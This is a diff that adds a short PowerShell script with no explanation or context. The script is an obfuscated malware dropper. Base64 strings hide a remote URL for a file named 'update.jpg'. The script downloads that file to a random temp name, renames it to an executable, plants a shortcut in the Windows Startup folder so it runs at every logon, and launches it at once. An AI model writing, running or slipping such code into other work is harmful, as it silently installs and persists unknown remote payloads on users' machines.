@@ -1,0 +1,19 @@
+$u="aHR0cHM6Ly9iaXRlYmxvYi5jb20vRG93bmxvYWQvT3E3NVJkM2JGVGlVNGcvdXBkYXRlLmpwZw=="
+$s="U3RhcnR1cA=="
+$p="YS5sbms="
+$j="LmpwZw=="
+$x="LmV4ZQ=="
+$d=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u))
+$sf=[IO.Path]::Combine([Environment]::GetFolderPath('Startup'))
+$sp=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p))
+$extJpg=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($j))
+$extExe=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($x))
+$r=-join((48..57+65..90+97..122|Get-Random -Count 8|ForEach-Object{[char]$_}))
+$t=[IO.Path]::Combine([IO.Path]::GetTempPath(),"$r$extJpg")
+$e=$t -replace [regex]::Escape($extJpg),$extExe
+(New-Object Net.WebClient).DownloadFile($d,$t)
+ren $t $e
+$sc=(New-Object -ComObject WScript.Shell).CreateShortcut([IO.Path]::Combine($sf,$sp))
+$sc.TargetPath=$e
+$sc.Save()
+[System.Diagnostics.Process]::Start($e)
